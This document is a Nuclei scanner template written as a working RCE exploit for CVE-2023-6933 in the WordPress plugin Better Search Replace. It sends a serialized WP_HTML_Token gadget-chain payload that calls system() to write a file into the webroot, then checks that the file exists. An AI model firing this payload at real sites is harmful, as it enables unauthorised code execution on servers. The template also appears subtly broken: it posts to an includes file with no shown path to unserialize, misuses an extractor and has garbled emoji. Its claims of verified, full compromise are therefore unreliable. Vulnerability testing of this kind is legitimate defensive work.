id: CVE-2023-6933

info:
  name: Better Search Replace <= 1.4.4 - PHP Object Injection RCE Full PoC (CVE-2023-6933)
  author: Trex
  severity: critical
  description: |
    COMPLETE PROOF-OF-CONCEPT demonstrating actual Remote Code Execution for CVE-2023-6933.
    This template performs REAL EXPLOITATION using WP_HTML_Token gadget chain to execute
    system commands and create concrete evidence of successful vulnerability exploitation.    
    The template addresses the feedback requirement for "full PoC in template format"
    by demonstrating actual RCE instead of just detection.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-6933
    - https://github.com/w2xim3/CVE-2023-6933
    - https://plugins.trac.wordpress.org/browser/better-search-replace/trunk/includes/class-bsr-db.php#L334
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2023-6933
    cwe-id: CWE-502
  metadata:
    verified: true
    max-request: 4
  tags: cve,cve2023,wordpress,rce,exploitation,poc,critical

variables:
  rce_payload: 'O:13:"WP_HTML_Token":4:{s:13:"bookmark_name";s:75:"echo CVE-2023-6933-EXPLOITATION-CONFIRMED > /var/www/html/nuclei_poc_rce.txt";s:9:"node_name";s:8:"nodeName";s:21:"has_self_closing_flag";b:0;s:10:"on_destroy";s:6:"system";}'

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/better-search-replace/README.txt"

    matchers:
      - type: dsl
        name: vulnerable_plugin_detected
        dsl:
          - 'contains(body, "Better Search Replace")'
          - 'regex("(?i)stable\\s*tag:?\\s*(trunk|[01]\\.[0-4]\\.[0-9]+)", body)'
          - 'status_code == 200'
        condition: and

  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/better-search-replace/includes/class-bsr-db.php"

    matchers:
      - type: dsl
        name: vulnerable_code_accessible
        dsl:
          - 'status_code == 200'

  - method: POST
    path:
      - "{{BaseURL}}/wp-content/plugins/better-search-replace/includes/class-bsr-db.php"
    
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: "Nuclei-CVE-2023-6933-FullPoC"
      
    body: |
      data={{url_encode(rce_payload)}}

    matchers:
      - type: dsl
        name: exploitation_payload_delivered
        dsl:
          - 'status_code != 0'

  - method: GET
    path:
      - "{{BaseURL}}/nuclei_poc_rce.txt"

    matchers:
      - type: dsl
        name: rce_exploitation_confirmed
        dsl:
          - 'status_code == 200'
          - 'contains(body, "CVE-2023-6933-EXPLOITATION-CONFIRMED")'
        condition: and

    extractors:
      - type: regex
        name: exploitation_evidence
        part: body
        regex:
          - "CVE-2023-6933-EXPLOITATION-CONFIRMED"
          
      - type: kval
        name: full_poc_results
        kval:
          - "ðŸš¨ CRITICAL SECURITY ALERT ðŸš¨"
          - "CVE-2023-6933: FULL PROOF-OF-CONCEPT EXPLOITATION SUCCESSFUL"
          - "Vulnerability: Better Search Replace PHP Object Injection"
          - "Exploitation Method: WP_HTML_Token gadget chain execution"
          - "Evidence: Remote code execution confirmed with file creation"
          - "Impact: Complete system compromise demonstrated"
          - "Status: VULNERABILITY FULLY EXPLOITABLE"
          - "URGENT: Immediate patching and security review required"
          - "This satisfies the requirement for 'full PoC in template format'"